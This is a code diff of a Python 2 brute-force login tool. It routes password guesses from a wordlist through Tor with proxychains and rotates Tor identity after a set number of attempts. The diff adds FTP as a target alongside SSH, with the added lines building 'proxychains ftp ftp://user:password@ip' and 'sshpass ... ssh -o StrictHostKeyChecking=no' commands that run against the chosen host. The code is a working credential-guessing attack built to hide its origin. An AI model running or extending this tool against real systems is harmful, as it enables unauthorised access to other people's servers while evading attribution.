@@ -75,6 +75,7 @@ def argvcontrol():
 	parser.add_argument("-p","--port", help="Destination port", default="22")
 	parser.add_argument("-a","--attempts", help="Number of attempts before identity change", default="3")
 	parser.add_argument("-w","--wait", help="Waiting time after Tor service restart", default=1)
+	parser.add_argument("-s","--service", help="The targeted service: ssh, ftp", default='ssh')
 	parser.add_argument("-t","--test", help="Use the to test dependences", action='store_true', default=False)
 	args = parser.parse_args()
 
@@ -87,7 +88,7 @@ def argvcontrol():
 		pass
 	else:
 		print "[!] Invalid bruteforce type, choose between: user, pass"
-		exit()
+		valid = False
 	if not ipValidator(args.ip):
 		print "[!] Invalid Hostname or Ip Address"
 		valid = False
@@ -99,6 +100,9 @@ def argvcontrol():
 		valid = False
 	if not attemptsValidation(args.attempts):
 		print "[!] Attempts invalid"
+		valid = False
+	if args.service != "ssh" and args.service != "ftp":
+		print "[!] Invalid service, choose between: ssh, ftp"
 		valid = False
 
 	return valid, args
@@ -123,6 +127,7 @@ def main():
 			wordlist = check[1].wordlist
 			attempts = int(check[1].attempts)
 			wait = int(check[1].wait)
+			service = check[1].service
 			user = ""
 			password = ""
 
@@ -155,7 +160,11 @@ def main():
 					user =  line[:-1]
 				elif bruteforce == "pass":
 					password = line[:-1]
-				var = 'proxychains sshpass -p ' + password + ' ssh -o StrictHostKeyChecking=no ' + user + '@' + ip + ' -p ' + port
+
+				if service == "ssh":
+					var = 'proxychains sshpass -p ' + password + ' ssh -o StrictHostKeyChecking=no ' + user + '@' + ip + ' -p ' + port
+				elif service == "ftp":
+					var = 'proxychains ftp ftp://' + user + ':' + password + '@' + ip
 				var_list = var.split(' ')
 				print '[*] ' + var
 				subprocess.call(var_list)
